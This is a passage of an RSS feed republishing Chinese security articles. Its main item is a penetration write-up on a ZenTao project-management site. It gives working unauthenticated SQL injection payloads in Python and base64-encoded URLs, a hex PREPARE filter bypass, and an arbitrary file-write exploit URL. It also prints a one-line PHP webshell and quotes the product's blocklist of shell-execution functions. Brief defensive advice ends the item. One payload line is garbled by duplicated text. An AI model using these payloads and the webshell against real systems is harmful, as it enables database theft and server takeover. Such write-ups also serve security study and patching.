&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;A页面是目标网站，其中设置自己的name是baidu；B是攻击者的页面，其中设置&lt;code class=&quot;inline&quot;&gt;target=&quot;baidu&quot;&lt;/code&gt; &lt;/p&gt;&lt;p&gt;显然，我们在B中点击“click me”以后，会打开一个新的页面，而不是修改A页面的URL。这个实验说明，URL的远程控制和window.name没有直接关系，而是和页面的父子关系有关。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x04&quot;&gt;0x04 总结&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。&lt;/p&gt;&lt;p&gt;但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-03-13-34495488</guid>
<pubDate>Tue, 13 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>从SQL注入到Getshell：记一次禅道系统的渗透</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-07-34275981.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34275981&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c9c286b86cab690e0da2551d738fc1d1_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt; &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/03f40f07ca96c5b31c8892400eec8c1d&quot; data-hash=&quot;03f40f07ca96c5b31c8892400eec8c1d&quot; data-hovercard=&quot;p$b$03f40f07ca96c5b31c8892400eec8c1d&quot;&gt;@L3m0n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;此过程为某站点的渗透记录，过程一波三折，但归根结底都是粗心大意造成的，不过自我认为在这个排坑的过程中也学习到了很多。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;确认版本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以通过接口来确认一下当前禅道的版本。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?mode=getconfig&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c6d7fb7d4b2d437eb33d3644630813b4_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1582&quot;&gt;&lt;h2&gt;&lt;b&gt;SQL注入分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;网上之前有过一个&lt;code class=&quot;inline&quot;&gt;9.1.2&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数的分析，但是没想到&lt;code class=&quot;inline&quot;&gt;9.2.1&lt;/code&gt;也存在此问题，(&lt;code class=&quot;inline&quot;&gt;2018.3.2&lt;/code&gt;号看到目前最新版本是&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;)。&lt;/p&gt;&lt;p&gt;出问题的地方是此文件的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数：\lib\base\dao\dao.class.php&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;public function orderBy($order)
{
    if($this-&amp;gt;inCondition and !$this-&amp;gt;conditionIsTrue) return $this;

    $order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);

    /* Add &quot;`&quot; in order string. */
    /* When order has limit string. */
    $pos    = stripos($order, &#39;limit&#39;);
    $orders = $pos ? substr($order, 0, $pos) : $order;
    $limit  = $pos ? substr($order, $pos) : &#39;&#39;;
    $orders = trim($orders);
    if(empty($orders)) return $this;
    if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);

    $orders = explode(&#39;,&#39;, $orders);
    foreach($orders as $i =&amp;gt; $order)
    {
        $orderParse = explode(&#39; &#39;, trim($order));
        foreach($orderParse as $key =&amp;gt; $value)
        {
            $value = trim($value);
            if(empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) continue;

            $field = $value;
            /* such as t1.id field. */
            if(strpos($value, &#39;.&#39;) !== false) list($table, $field) = explode(&#39;.&#39;, $field);
            if(strpos($field, &#39;`&#39;) === false) $field = &quot;`$field`&quot;;

            $orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field :  $field;
            unset($table);
        }
        $orders[$i] = join(&#39; &#39;, $orderParse);
        if(empty($orders[$i])) unset($orders[$i]);
    }
    $order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;

    $this-&amp;gt;sql .= &#39; &#39; . DAO::ORDERBY . &quot; $order&quot;;
    return $this;
}&lt;/code&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;后未做严格的过滤与判断，然后拼接到了&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;后面导致产生注入.&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;&lt;/code&gt;&lt;p&gt;看了一下&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;的修补是对limit进行正则限制，但是事实上感觉此处正则是写了一个bug，比如正常调用&lt;code class=&quot;inline&quot;&gt;orderBy($order)&lt;/code&gt;的时候，其中&lt;code class=&quot;inline&quot;&gt;$order&lt;/code&gt;为&lt;code class=&quot;inline&quot;&gt;abc desc limit 1,1&lt;/code&gt;的时候，进入&lt;code class=&quot;inline&quot;&gt;$limit&lt;/code&gt;则是&lt;code class=&quot;inline&quot;&gt;limit 1,1&lt;/code&gt;，导致匹配失败。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/* Add &quot;`&quot; in order string. */
/* When order has limit string. */
$pos    = stripos($order, &#39;limit&#39;);
$orders = $pos ? substr($order, 0, $pos) : $order;
$limit  = $pos ? substr($order, $pos) : &#39;&#39;;
if($limit and !preg_match(&#39;/^[0-9]+ *(, *[0-9]+)?$/&#39;, $limit)) $limit = &#39;&#39;;&lt;/code&gt;&lt;p&gt;如果想要造成前台注入（无需登录）的话，就得先看看禅道开放了哪些接口，看是否有调用&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数。&lt;/p&gt;&lt;p&gt;\zentao\module\common\model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function isOpenMethod($module, $method)
{
   if($module == &#39;user&#39; and strpos(&#39;login|logout|deny|reset&#39;, $method) !== false) return true;
   if($module == &#39;api&#39;  and $method == &#39;getsessionid&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;ping&#39;)  return true;
   if($module == &#39;misc&#39; and $method == &#39;checktable&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;qrcode&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;about&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;checkupdate&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;changelog&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;login&#39;)  return true;
   if($module == &#39;sso&#39; and $method == &#39;logout&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;bind&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;gettodolist&#39;) return true;
   if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;

   if($this-&amp;gt;loadModel(&#39;user&#39;)-&amp;gt;isLogon() or ($this-&amp;gt;app-&amp;gt;company-&amp;gt;guest and $this-&amp;gt;app-&amp;gt;user-&amp;gt;account == &#39;guest&#39;))
   {
       if(stripos($method, &#39;ajax&#39;) !== false) return true;
       if(stripos($method, &#39;downnotify&#39;) !== false) return true;
       if($module == &#39;tutorial&#39;) return true;
       if($module == &#39;block&#39;) return true;
       if($module == &#39;product&#39; and $method == &#39;showerrornone&#39;) return true;
   }
   return false;
}&lt;/code&gt;&lt;p&gt;其中的&lt;code class=&quot;inline&quot;&gt;if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;&lt;/code&gt;，也就是本次漏洞的主角，继续跟进。&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;class block extends control
{
    public function __construct($moduleName = &#39;&#39;, $methodName = &#39;&#39;)
    {
        parent::__construct($moduleName, $methodName);
        $this-&amp;gt;selfCall = strpos($this-&amp;gt;server-&amp;gt;http_referer, common::getSysURL()) === 0 || $this-&amp;gt;session-&amp;gt;blockModule;
        if($this-&amp;gt;methodName != &#39;admin&#39; and $this-&amp;gt;methodName != &#39;dashboard&#39; and !$this-&amp;gt;selfCall and !$this-&amp;gt;loadModel(&#39;sso&#39;)-&amp;gt;checkKey()) die(&#39;&#39;);
    }
    public function main($module = &#39;&#39;, $id = 0)
    {
        ...
       $mode = strtolower($this-&amp;gt;get-&amp;gt;mode);
       if($mode == &#39;getblocklist&#39;)
       {   
           ...
       }   
       elseif($mode == &#39;getblockform&#39;)
       {   
           ...
       }   
       elseif($mode == &#39;getblockdata&#39;)
       {
           $code = strtolower($this-&amp;gt;get-&amp;gt;blockid);
    
           $params = $this-&amp;gt;get-&amp;gt;param;
           $params = json_decode(base64_decode($params));
            ....
           $this-&amp;gt;viewType    = (isset($params-&amp;gt;viewType) and $params-&amp;gt;viewType == &#39;json&#39;) ? &#39;json&#39; : &#39;html&#39;;
           $this-&amp;gt;params      = $params;
           $this-&amp;gt;view-&amp;gt;code  = $this-&amp;gt;get-&amp;gt;blockid;
           $this-&amp;gt;view-&amp;gt;title = $this-&amp;gt;get-&amp;gt;blockTitle;
    
           $func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;
           if(method_exists(&#39;block&#39;, $func))
           {
               $this-&amp;gt;$func($module);
           }
           else
           {
               $this-&amp;gt;view-&amp;gt;data = $this-&amp;gt;block-&amp;gt;$func($module, $params);
           }
       }
    }
}&lt;/code&gt;&lt;p&gt;首先看&lt;code class=&quot;inline&quot;&gt;__construct&lt;/code&gt;中，&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;selfCall&lt;/code&gt;是在验证&lt;code class=&quot;inline&quot;&gt;referer&lt;/code&gt;的值，如果为真的话则后面的&lt;code class=&quot;inline&quot;&gt;if&lt;/code&gt;将不会进入&lt;code class=&quot;inline&quot;&gt;die&lt;/code&gt;语句里面&lt;/p&gt;&lt;p&gt;接下来跟进&lt;code class=&quot;inline&quot;&gt;main&lt;/code&gt;函数，可以看到最后的&lt;code class=&quot;inline&quot;&gt;$func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;&lt;/code&gt;，会对一些函数进行调用，与此同时，我们搜索&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;的调用的时候可以发现&lt;code class=&quot;inline&quot;&gt;printCaseBlock&lt;/code&gt;函数的存在&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-dc18e0f1b6d8b747c6ec554acae5d139_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2246&quot;&gt;&lt;p&gt;所以前台注入的整个过程便比较清晰了，那么如何利用?&lt;/p&gt;&lt;h2&gt;&lt;b&gt;SQL注入利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回过头来，因为禅道有windows直接的一键化安装程序，其数据库使用的也是&lt;code class=&quot;inline&quot;&gt;root&lt;/code&gt;权限，导致可直接导出shell，但是如果没有这么高权限的时候，对于这个注入应该如何出数据。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &#39;select user()&#39;
param = &#39;{&quot;orderBy&quot;:&quot;order limit 1;select (if(ord(mid((%s),%d,1))=%d,sleep(2),1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) ,1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) &lt;/code&gt;&lt;p&gt;禅道是支持多语句的，这也为后面的利用提供方便。&lt;/p&gt;&lt;p&gt;注入出数据库名和表段名后，当我想继续注入出用户账号密码的时候，意外地发现没有出数据。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;sql = &#39;select 12345 from zt_user&#39;&lt;/code&gt;&lt;p&gt;还是没有出数据，猜测是管理员改了表前缀，所以想去通过&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;查询一下表名，但是意外地发现，也不能读取？难道被删了？但是我还是想知道一下表前缀。&lt;/p&gt;&lt;p&gt;请求的时候加了一个单引号，并且加上referer，看一下报错信息。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxJyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=

其中param经过BASE64解码得到
{&quot;orderBy&quot;:&quot;order limit 1,1&#39;&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2b635f910bb80ada4553155d1c748f29_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2710&quot;&gt;&lt;p&gt;因为PDO的关系，SQL中的表名是&lt;code class=&quot;inline&quot;&gt;%s&lt;/code&gt;替代的，所以未能够得到库名。&lt;/p&gt;&lt;p&gt;那么就利用报错去得到当前SQl语句里面查询的表名，比如利用&lt;code class=&quot;inline&quot;&gt;polygon&lt;/code&gt;函数。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-adbcf88a750df6340c76cb8c7da63235_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2696&quot;&gt;&lt;p&gt;此注入点可以理解为limit后的注入点，因为使用多语句的话，报错效果不明显，所以就直接在limit后面进行注入。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=

param base64解码
{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-56760516eb1da1fa547b876b9838bd67_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2544&quot;&gt;&lt;p&gt;上图为本地测试，但是limit的注入和mysql版本还有一些关系，目前网上的payload仅限于低版本才可报错注入出数据，很不幸运的是，目标使用的是高版本mysql。&lt;/p&gt;&lt;p&gt;那既然可以多语句，在不能用&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;的情况下，可以通过下面语法来进行盲注：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;show table status where name = &#39;xxx&#39; and sleep(2)&lt;/code&gt;&lt;p&gt;写到py里面的payload是这样的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &quot;show table status where hex(substr(name,1,8))=&#39;7a745f75736572%s&#39; and sleep(2)&quot; % binascii.b2a_hex(chr(i))
param = &#39;{&quot;orderBy&quot;:&quot;order limit 1,1;%s--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % sql&lt;/code&gt;&lt;p&gt;经过一番折腾发现，表前缀就是默认的&lt;code class=&quot;inline&quot;&gt;zt_&lt;/code&gt;，但是为啥又不能够读取到用户数据呢?&lt;/p&gt;&lt;p&gt;仔细看到禅道里面的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数，发现做了过滤。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);&lt;/code&gt;&lt;p&gt;把下划线给过滤掉了，那这种在多语句下，可以利用mysql的预查询来绕过，值得注意的是，这个版本语法大小写敏感。&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;&lt;/code&gt;&lt;p&gt;注入出admin密码的时候，惊喜地发现不能解开，无奈之下，只能先拿到一个普通账号。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Getshell&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;禅道在防止getshell方面还花了一点心思，曾经挖到一个可以任意写文件getshell（最新版本还存在这段代码），不过需要的权限是管理员权限。&lt;/p&gt;&lt;p&gt;看了一下禅道里面人员组织架构情况，有研发、项目经理、产品经理，高层管理，系统管理员等角色，其中系统管理员虽然密码解不开，但是我们可以去解密一下高层管理的密码，因为这个角色的权限是可以修改某用户的用户组权限。在高层管理账号中，我们可以将一个普通账号修改为管理员。&lt;/p&gt;&lt;p&gt;接下来就是写文件Getshell：&lt;/p&gt;&lt;p&gt;/xampp/zentaopro/module/api/control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function getModel($moduleName, $methodName, $params = &#39;&#39;)
{
    parse_str(str_replace(&#39;,&#39;, &#39;&amp;amp;&#39;, $params), $params);
    $module = $this-&amp;gt;loadModel($moduleName);
    
    $result = call_user_func_array(array(&amp;amp;$module, $methodName), $params);
    if(dao::isError()) die(json_encode(dao::getError()));
    $output[&#39;status&#39;] = $result ? &#39;success&#39; : &#39;fail&#39;;
    $output[&#39;data&#39;]   = json_encode($result);
    $output[&#39;md5&#39;]    = md5($output[&#39;data&#39;]);
    $this-&amp;gt;output     = json_encode($output);
    die($this-&amp;gt;output);
}&lt;/code&gt;&lt;p&gt;可以看到是进入了call_user_func_array，也就是我们可以任意实例化一个module方法，方法的参数也是可控的，可以通过&lt;code class=&quot;inline&quot;&gt;,&lt;/code&gt;来分割参数。&lt;/p&gt;&lt;p&gt;/zentaopro/module/editor/model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function save($filePath)
{
    $fileContent = $this-&amp;gt;post-&amp;gt;fileContent;
    $evils       = array(&#39;eval&#39;, &#39;exec&#39;, &#39;passthru&#39;, &#39;proc_open&#39;, &#39;shell_exec&#39;, &#39;system&#39;, &#39;$$&#39;, &#39;include&#39;, &#39;require&#39;, &#39;assert&#39;);
    $gibbedEvils = array(&#39;e v a l&#39;, &#39;e x e c&#39;, &#39; p a s s t h r u&#39;, &#39; p r o c _ o p e n&#39;, &#39;s h e l l _ e x e c&#39;, &#39;s y s t e m&#39;, &#39;$ $&#39;, &#39;i n c l u d e&#39;, &#39;r e q u i r e&#39;, &#39;a s s e r t&#39;);
    $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);
    if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);

    $dirPath = dirname($filePath);
    $extFilePath = substr($filePath, 0, strpos($filePath, DS . &#39;ext&#39; . DS) + 4);
    if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true);
    if(is_writable($dirPath))
    {
        file_put_contents($filePath, $fileContent);
    }
    else
    {
        die(js::alert($this-&amp;gt;lang-&amp;gt;editor-&amp;gt;notWritable . $extFilePath));
    }
}&lt;/code&gt;&lt;p&gt;在editor中是可以写一个文件的，filePath可控，fileContent也是可控的，这下就是可以任意写一个文件。&lt;/p&gt;&lt;p&gt;Exp:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/?m=api&amp;amp;f=getModel&amp;amp;moduleName=editor&amp;amp;methodName=save&amp;amp;params=filePath=aaaaaa.php

POST内容:
fileContent=&amp;lt;?php $_POST[1]($_POST[2]);

最后的shell地址是\zentaopro\module\api\aaaaaa.php&lt;/code&gt;&lt;p&gt;但是问题又来了，前面报错里面得到的路径目录感觉像是做了权限（这里绕弯了，路径少加了一个www，所以以为是没权限写），最终从数据库中的&lt;code class=&quot;inline&quot;&gt;zt_file&lt;/code&gt;获取上传文件的路径，然后再将shell写入当中才得以结束。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;的漏洞如何进行防御的时候，我觉得上面代码在部分上有可取之处。&lt;/p&gt;&lt;p&gt;1、去掉&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;部分，然后限制格式&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);&lt;/code&gt;&lt;p&gt;2、然后循环对每个字段进行反引号的添加&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$orders = explode(&#39;,&#39;, $orders);
foreach ($orders as $i =&amp;gt; $order) {
	$orderParse = explode(&#39; &#39;, trim($order));
	foreach ($orderParse as $key =&amp;gt; $value) {
		$value = trim($value);
		if (empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) {
			continue;
		}

		$field = $value;
		/* such as t1.id field. */
		if (strpos($value, &#39;.&#39;) !== false) {
			list($table, $field) = explode(&#39;.&#39;, $field);
		}

		if (strpos($field, &#39;`&#39;) === false) {
			$field = &quot;`$field`&quot;;
		}

		$orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field : $field;
		unset($table);
	}
	$orders[$i] = join(&#39; &#39;, $orderParse);
	if (empty($orders[$i])) {
		unset($orders[$i]);
	}

}&lt;/code&gt;&lt;p&gt;整个过程就是自己在挖莫名其妙的坑，然后再一个个慢慢补上，希望能够对大家有用。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-03-07-34275981</guid>
<pubDate>Wed, 07 Mar 2018 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
